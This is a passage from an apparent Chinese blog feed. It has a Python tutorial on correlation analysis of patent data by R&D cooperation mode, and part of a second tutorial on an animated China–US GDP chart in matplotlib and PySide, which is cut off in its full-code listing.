    <content type="html"><![CDATA[<p>平时在做数据分析的时候，会要对特征进行相关性分析，分析某些特征之间是否存在相关性。本文将通过一个实例来对数据进行相关性分析与展示。</p><h2 id="一、数据集介绍"><a href="#一、数据集介绍" class="headerlink" title="一、数据集介绍"></a>一、数据集介绍</h2><p>本次分析的是企业合作研发模式效果分析，企业的合作研发大致分为 企企合作、企学合作、企研合作、企学研合作，也就是企业与企业合作研发、企业与大学合作研发、企业与研究所合作研法、企业联合学校、研究所共同合作研发。现在就是想通过数据分析来看看那种合作研发模式的效果最好，产出最佳。</p><p>数据集是从公开网站获取的公开的专利信息，包括专利的公告日期、专利评分、专利估值，这些指标说明了专利的价值。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E4%B8%93%E5%88%A9%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="专利数据集"></p><h2 id="二、数据整理和探索"><a href="#二、数据整理和探索" class="headerlink" title="二、数据整理和探索"></a>二、数据整理和探索</h2><p>有了数据后先对数据进行整理，在这里我们用II表示企企合作、IU表示企学合作、IR表示企研合作、IUR表示企学研合作。<br>先导入python数据分析三大件numpy、pandas、matplotlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">"font.sans-serif"</span>]=[<span class="string">"SimHei"</span>] <span class="comment">#设置字体</span></span><br><span class="line">plt.rcParams[<span class="string">"axes.unicode_minus"</span>]=<span class="literal">False</span> <span class="comment">#该语句解决图像中的“-”负号的乱码问题</span></span><br></pre></td></tr></table></figure><p>对数据进行整理，将“有效”的数据检索出来，将合作研发的模式标识出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">II_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企企合作申报总数据_21578_2023-03-11.xlsx'</span>) <span class="comment">#企企合作</span></span><br><span class="line">IU_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学合作申报总数据_6451_2023-03-11.xlsx'</span>)  <span class="comment">#企学合作</span></span><br><span class="line">IR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企研合作申报总数据_1706_2023-03-11.xlsx'</span>)  <span class="comment">#企研合作</span></span><br><span class="line">IUR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学研合作申报总数据_241_2023-03-11.xlsx'</span>)  <span class="comment">#企学研合作</span></span><br><span class="line">II_data_original[<span class="string">'class_type'</span>]=<span class="string">'II'</span></span><br><span class="line">IU_data_original[<span class="string">'class_type'</span>]=<span class="string">'IU'</span></span><br><span class="line">IR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IR'</span></span><br><span class="line">IUR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IUR'</span></span><br><span class="line">data_original=II_data_original.append([IU_data_original,IR_data_original,IUR_data_original])</span><br><span class="line">data_original=data_original[(data_original.法律有效性==<span class="string">'有效'</span>)]</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A0%87%E7%AD%BE.png" alt="合作研发的模式标识"><br>对日期进行处理，我们以年度为单位来分析每年各企业合作研发模式的数据，所以将日期处理成“年”为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理日期</span></span><br><span class="line">data_original[<span class="string">'date'</span>]=pd.to_datetime(data_original[<span class="string">'公开(公告)日'</span>],format=<span class="string">"%Y%m%d"</span>)</span><br><span class="line">data_original[<span class="string">'year'</span>]=data_original[<span class="string">'date'</span>].dt.strftime(<span class="string">'%Y'</span>)</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%B9%B4%E4%BB%BD%E6%A0%87%E7%AD%BE.png" alt="年份标签"></p><p>我们只需要分析相应的专利质量的指标，这里与专利质量相关的指标大致为引文数量、专利估值、专利评分。然后以年度为单位来看看数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data_group=data_original.groupby([<span class="string">'year'</span>,<span class="string">'class_type'</span>]).size()</span><br><span class="line">df_data_group=data_group.unstack()</span><br><span class="line">data_group_count=data_original.groupby([<span class="string">'year'</span>]).size()</span><br><span class="line">data_group_quotecount=data_original[[<span class="string">'year'</span>,<span class="string">'引文数量总计'</span>]].groupby([<span class="string">'year'</span>]).sum()  <span class="comment">#引文数量</span></span><br><span class="line">data_group_value=data_original[[<span class="string">'year'</span>,<span class="string">'专利估值'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利估值</span></span><br><span class="line">data_group_grade=data_original[[<span class="string">'year'</span>,<span class="string">'专利评分'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利评分grade</span></span><br><span class="line">df_data_group[<span class="string">'count'</span>]=data_group_count</span><br><span class="line">df_data_group[<span class="string">'quotecount'</span>]=data_group_quotecount</span><br><span class="line">df_data_group[<span class="string">'value'</span>]=data_group_value</span><br><span class="line">df_data_group[<span class="string">'grade'</span>]=data_group_grade</span><br><span class="line">df_data_group</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E7%A0%94%E5%8F%91%E6%95%B0%E6%8D%AE.png" alt="合作研发数据"></p><p>历年（2004-2022年）专利的合作模式的专利数量增长趋势</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group.plot.bar(y=[<span class="string">'II'</span>,<span class="string">'IR'</span>,<span class="string">'IU'</span>,<span class="string">'IUR'</span>],figsize=(<span class="number">32</span>,<span class="number">4</span>),stacked=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%A2%9E%E9%95%BF%E8%B6%8B%E5%8A%BF.png" alt="合作模式的专利数量增长趋势"></p><p>历年（2015-2022年）的合作模式的专利数量对比情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>].plot.bar(y=[<span class="string">'II'</span>, <span class="string">'IR'</span>, <span class="string">'IU'</span>, <span class="string">'IUR'</span>], figsize=(<span class="number">32</span>, <span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%AF%B9%E6%AF%94%E6%83%85%E5%86%B5.png" alt="合作模式的专利数量对比情况"></p><p>从数据上可以看出，从2004年-2021年前些年，企业的研发模式是比较单一的，2004-2008年大部分都是企企合作的研发模式，其他研发模式先对比较少。从2004年-2021年，随着我国企业对研发的投入力度也来越大，专利的数量是逐年递增的，研发模式也逐步的多样化起来，但还是以企企合作和企学合作为主。</p><h2 id="三、数据相关性分析与展示"><a href="#三、数据相关性分析与展示" class="headerlink" title="三、数据相关性分析与展示"></a>三、数据相关性分析与展示</h2><p>因为从数据上看，从2015年以后各种研发模式逐步的多样化起来，所以我们来看一下2015年以后研发模式与研发质量各项指标的相关性。<br>通过numpyde的corrcoef()方法可以很方便的计算出各个特征之间的相关性系数，得出相关性矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruslut=np.corrcoef(df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>],rowvar=<span class="literal">False</span>)</span><br><span class="line">ruslut</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5.png" alt="相关性矩阵"></p><p>看数据肯定没有看图形直观，所以我们将这个相关性矩阵进行可视化的展示。这里用seaborn来做数据的图形化展示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">figure, ax = plt.subplots(figsize=(<span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">df=df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>]</span><br><span class="line">sns.heatmap(df.corr(), square=<span class="literal">True</span>, annot=<span class="literal">True</span>, ax=ax)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5%E5%9B%BE.png" alt="相关性矩阵图形化展示"></p><p>这里可以看出企企合作和企学合作的数量相关性比较高，而企研合作value和grade具有相关性，说明企研合作模式的研发质量相对来说比较好。</p><p>最后，我们来看一下专利TOP20的单位研发类型分布、估值TOP20的专利的研发类型分布、评分TOP20的专利、研发类型的分布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data_countbyComp=data_original[[<span class="string">'第一申请人-原文'</span>,<span class="string">'class_type'</span>]].groupby([<span class="string">'第一申请人-原文'</span>]).size()</span><br><span class="line">df_data_countbyComp=pd.DataFrame(data_countbyComp,columns=[<span class="string">'counts'</span>])</span><br><span class="line">df_data_countbyCompTOP=df_data_countbyComp.sort_values(<span class="string">'counts'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top=data_original[(data_original[<span class="string">'第一申请人-原文'</span>].isin(df_data_countbyCompTOP.index.values))]</span><br><span class="line">value_top=data_original.sort_values(<span class="string">'专利估值'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">grade_top=data_original.sort_values(<span class="string">'专利评分'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top_show=count_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">value_top_show=value_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show=grade_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show.index.values</span><br><span class="line">fig, axs = plt.subplots(<span class="number">1</span>, <span class="number">3</span>,figsize=(<span class="number">18</span>, <span class="number">18</span>))</span><br><span class="line">axs[<span class="number">0</span>].pie(count_top_show,labels=count_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">0</span>].set(title=<span class="string">'数量TOP20的单位,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">1</span>].pie(value_top_show,labels=value_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.05</span>))</span><br><span class="line">axs[<span class="number">1</span>].set(title=<span class="string">'估值TOP20的专利,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">2</span>].pie(grade_top_show,labels=grade_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">2</span>].set(title=<span class="string">'评分TOP20的专利,研发类型分布'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%88%86%E5%B8%83%E5%9B%BE.png" alt="分布图"></p><p>这里可以看出数量上还是以企企合作研发的模式最多，但是从专利的估值评分来看企学的专利估值占比最高。说明从 企企合作、企学合作、企研合作、企学研合作的这些企业合作研发模式看，企企合作研发数量最多，企学合作研发的质量相对较高。</p><p>至此，本文通过一个实例介绍了用python通过数据分析三件套numpy、pandas、matplotlib进行数据相关性分析的过程。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平时在做数据分析的时候，会要对特征进行相关性分析，分析某些特征之间是否存在相关性。本文将通过一个实例来对数据进行相关性分析与展示。&lt;/p&gt;
&lt;h2 id=&quot;一、数据集介绍&quot;&gt;&lt;a href=&quot;#一、数据集介绍&quot; class=&quot;headerlink&quot; title=&quot;一、数据集
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python通过matplotlib动态绘图实现中美GDP历年对比趋势动图</title>
    <link href="https://xiejava.gitee.io/posts/66779ce6/"/>
    <id>https://xiejava.gitee.io/posts/66779ce6/</id>
    <published>2023-08-27T03:46:35.000Z</published>
    <updated>2023-08-27T04:02:19.660Z</updated>
    
    <content type="html"><![CDATA[<p>随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GDP做个对比，展示中国GPD对美国的追赶态势，相信不久的将来中国的GDP数据将稳超美国。</p><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E8%87%AA%E5%8A%A8.gif" alt="中美GDP历年对比趋势动图"></p><p>实现上面的动态绘图效果，综合用到了pandas的数据采集、数据整理、matplotlib绘图、坐标轴及数据的动态定义、定时器等知识。最终通过Python的GUI库PySide进行展示形成一个GUI的可执行程序。</p><h2 id="一、数据采集和准备"><a href="#一、数据采集和准备" class="headerlink" title="一、数据采集和准备"></a>一、数据采集和准备</h2><p>中美历年的GDP数据通过百度在网上一搜一大把。我是从<a href="https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html" target="_blank" rel="noopener">https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html</a> 找到的数据。将数据整理成EXCEL保存至data\中国VS美国.xlsx。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="中国VS美国GDP数据集"></p><p>有从1966年至2022年的中美GDP的数据。<br>首先对这些数据进行整理，因为获取的GDP数据是字符串类型如17.96万亿 (17,963,170,521,079)，我们需要将GDP的数据从文本中提取出来，也就是取括号中的数据。<br>这里通过正则表达式将括号中的GDP数据提取出来，并转换为亿元为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line">    </span><br><span class="line">df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br></pre></td></tr></table></figure><p>有了数据以后就可以通过数据绘图了。</p><h2 id="二、matplotlib绘图"><a href="#二、matplotlib绘图" class="headerlink" title="二、matplotlib绘图"></a>二、matplotlib绘图</h2><p>先通过matplotlib绘图看看数据的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'china_gdp_value'</span>])</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'us_gdp_value'</span>])</span><br><span class="line">plt.title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'年份'</span>)</span><br><span class="line">plt.ylim(<span class="string">'GDP（亿）'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E8%B6%8B%E5%8A%BF.png" alt="中美GDP对比趋势"></p><p>可以看到中国的GDP数据在1960年至1990年都是比较平稳的，到了1990年后中国开始了爆发式的追赶模式。<br>我们要将这种趋势通过动态的方式展示出来。</p><h2 id="三、数据展示与动态更新"><a href="#三、数据展示与动态更新" class="headerlink" title="三、数据展示与动态更新"></a>三、数据展示与动态更新</h2><p>首先通过QMainWindw定义QWidget组件，在QWidget中加入FigureCanvasQTAgg组件通过canvas载入matplotlib绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br></pre></td></tr></table></figure><p>一种方式是通过QSlider组件，通过手动拉slider组件来实现数据的变化，一种通过QTimer组件自动让数据变化。</p><h3 id="1、QSlider组件，手动方式实现动态绘图"><a href="#1、QSlider组件，手动方式实现动态绘图" class="headerlink" title="1、QSlider组件，手动方式实现动态绘图"></a>1、QSlider组件，手动方式实现动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slot()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">    <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">    f = int(new_val)</span><br><span class="line">    offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">    show_data = self.org_data[f: offset]</span><br><span class="line">    x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">    y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">    y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">    self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">    self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">    self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">    self.canvas.draw()</span><br></pre></td></tr></table></figure><p>手动拉slider组件来实现数据的变化效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E6%89%8B%E5%8A%A8.gif" alt="手动数据变化"></p><h3 id="2、QTimer组件，自动动态绘图"><a href="#2、QTimer组件，自动动态绘图" class="headerlink" title="2、QTimer组件，自动动态绘图"></a>2、QTimer组件，自动动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    self.autoslider()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.timer = QTimer()</span><br><span class="line">    self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">    self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据 </span></span><br><span class="line">    self.timer.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.update_frequency(self.auto_offset)</span><br><span class="line">    self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">    <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">        self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>效果如文章最前面所示。</p><h2 id="四、完整代码"><a href="#四、完整代码" class="headerlink" title="四、完整代码"></a>四、完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 